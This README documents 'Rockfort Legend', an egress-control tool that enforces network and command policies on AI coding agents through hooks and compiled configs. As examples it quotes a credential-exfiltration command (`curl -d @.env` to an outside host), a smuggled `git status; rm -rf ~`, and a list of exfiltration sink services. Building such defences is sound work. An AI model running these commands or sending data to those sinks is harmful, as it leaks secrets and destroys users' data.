# Rockfort Legend

Egress control for coding agents. One policy file, compiled into every
harness's native config and enforced at runtime by hooks where hooks exist.

It started as a set of plain-English permission cards for people who are not
developers. That layer is still here — every block still explains itself in a
sentence a non-engineer can act on — but the centre of gravity has moved to the
question security teams actually ask:

> Can you manage coding-agent domain allowlists programmatically, or block bad
> network requests, without allowlisting the entire internet?

## The model

```
                    policy/policy.json
                            │
        ┌───────────────────┼───────────────────┐
        │                   │                   │
   runtime hooks       compiled config     vendor consoles
   (judge each call)   (enforce ahead)     (flat domain lists)
        │                   │                   │
  Claude Code          Codex proxy         Devin, Cursor Cloud
  Cursor               Claude sandbox      Squid / mitm
```

Two things make this different from a domain allowlist:

**You do not allowlist the internet — you allowlist classes and deny sinks.**
`class:package-registries`, `class:vcs`, `class:docs` cover the traffic real
work generates. `class:exfil-sinks` covers where stolen data goes: webhook.site,
transfer.sh, pastebin, ngrok tunnels, Burp collaborator, Telegram bot API.
Everything else is `ask`, and `rlegend learn` turns a week of real asks into
allowlist entries you can justify.

**Intent beats destination.** The rule that catches the most is not a domain at
all — it is "this command reads a credential *and* opens a socket." That fires
on `curl -d @.env https://totally-legit-corp.com` even when the destination has
never been seen before and would otherwise be allowed.

## Install

**Claude Code** — strongest enforcement point. A `PreToolUse` hook can hard-deny.

```bash
node bin/rlegend.js sync --target claude --scope user --write     # hook + sandbox domains
node bin/rlegend.js sync --target claude --scope managed          # prints the MDM file + sudo cp line
```

Managed scope adds `allowManagedDomainsOnly`, `strictAllowlist`,
`failIfUnavailable` and `allowUnsandboxedCommands: false` — developers can no
longer widen the policy locally.

**Cursor** — hooks deny reliably; do not rely on them to *grant*.

```bash
node bin/rlegend.js sync --target cursor --write   # .cursor/hooks.json, committed to the repo
```

**Codex** — no pre-tool hook, so policy is compiled into the proxy config.

```bash
node bin/rlegend.js sync --target codex --write    # .codex/config.toml
```

**Hosted cloud agents (Devin, Cursor Cloud)** — no hook to hang policy on.

```bash
node bin/rlegend.js sync --target vendor --write   # flat allowlist.txt / denylist.txt
node bin/rlegend.js sync --target proxy --write    # squid.conf for a runner you control
```

Read [COVERAGE.md](COVERAGE.md) before promising any of this to a security
buyer. It says plainly where enforcement is real, where it is only detection,
and where it is nothing.

## Commands

```
rlegend check "<command>"           judge a command exactly as the hooks would
rlegend sync --target <t> --write   compile policy into harness config
rlegend allow <domain>              add to your policy layer
rlegend learn                       propose allowlist entries from observed traffic
rlegend skills                      inventory every loadable skill, flag drift
rlegend skills pin <id> | --all     accept a skill's current bytes
rlegend allowed                     what Rockfort Legend has stopped asking about
rlegend mcp                         MCP servers your agent actually uses
rlegend coverage                    the honest per-harness matrix
rlegend test                        the built-in suite — 70 cases
```

`rlegend help` has the full flag list. `rlegend package` builds the marketplace repo and
is for maintainers, not users.

## Policy layering

Lowest to highest: bundled default → `~/.rlegend/policy.json` →
`<repo>/.rlegend/policy.json` → `$RLEGEND_POLICY`. Within a list, `deny`
beats `ask` beats `allow` regardless of which layer contributed it. A layer
removes an inherited entry with a leading `!`:

```json
{ "allow": ["api.stripe.com", "!class:crypto"], "deny": ["*.myrival.com"] }
```

## Answering the boring prompts

Rockfort Legend does not approve things on your behalf, with one bounded exception it
is worth being precise about.

`policy.json` carries a `safeCommands` list — `npm test`, `pytest`, `go test`,
`tsc --noEmit`, `git status` and a dozen more. A command that matches one of
those **exactly** is answered instead of prompted.

What it is not: an auto-approval of anything scored green. Green means no rule
fired, which includes every command Rockfort Legend could not parse, and approving
that class is the direction that fails open. Matching is positive and by name.

Six things veto a match independently: any tool other than Bash, any verdict
that is not green, any destination at all, a pipe-to-shell / listener /
download-and-exec flag, any credential indicator in the command, and any shell
composition whatsoever — `;`, `|`, `&&`, redirects, substitutions, backslashes.
Composition is refused outright rather than parsed into parts, because
splitting on separators and checking each one is how `git status; rm -rf ~`
gets through.

The check also runs *after* Rockfort Legend has established that Claude Code was
going to raise a prompt. So it can remove a prompt, and it cannot enable an
action that was not already going to run.

Layers may narrow the list — `{"safeCommands": {"remove": ["cat"]}}` or
`{"enabled": false}` — from anywhere. Only the bundled policy and your own
`~/.rlegend/policy.json` may add to it: a `.rlegend/policy.json` committed
to a repo must not be able to hand that repo new auto-approvals.

## Auto-accept modes

`bypassPermissions`, `dontAsk` and `auto` are the user saying *stop asking me*.
Rockfort Legend takes that literally: in those modes it raises nothing, not even
red. Interrupting anyway would be inventing a prompt, which is the one thing it
will not do.

What it does instead is write everything down — what ran, what the verdict was,
and that nobody was asked — and report it afterwards. A `Stop` hook says so at
the end of the turn when something elevated ran unseen, and `/rlegend-session`
shows the full picture on demand.

Two things a quiet mode does **not** switch off:

- **Hard denies still block.** Credentials leaving the machine, `curl | bash`,
  a known exfil sink. Blocking is not the same as asking.
- **An allowlist is not a permission mode.** `Bash(sudo *)` is a claim about a
  command, so the tiny irreversible set — sudo, `rm -rf ~`, force-push, erasing
  a disk, dropping a table, `chmod 777` — still asks. `acceptEdits` sits on this
  side of the line too: it says edits are fine, not that nothing should be
  raised, so an edit to Claude's own config still asks.

## Unattended runs

An `ask` verdict is meaningless when nobody is watching. Set `RLEGEND_STRICT=1`
in cloud agents and background composers — every `ask` becomes a `deny`. That is
the setting for a machine nobody will ever read a recap from, and it is the
opposite trade to the one above: block rather than record.

## Layout

```
policy/policy.json     the single source of truth
lib/policy.js          layering + destination matching
lib/extract.js         pulls destinations out of shell, URLs, MCP args
lib/decide.js          the verdicts and the plain-English cards
lib/render.js          policy → each harness's native config
lib/audit.js           append-only egress log, feeds `rlegend learn`
adapters/claude-code.js  PreToolUse
adapters/cursor.js       beforeShellExecution / beforeMCPExecution / beforeReadFile
bin/rlegend.js              CLI
```

Vendor config keys were verified against the July 2026 docs. `lib/render.js` is
the only file that changes when a vendor renames something.
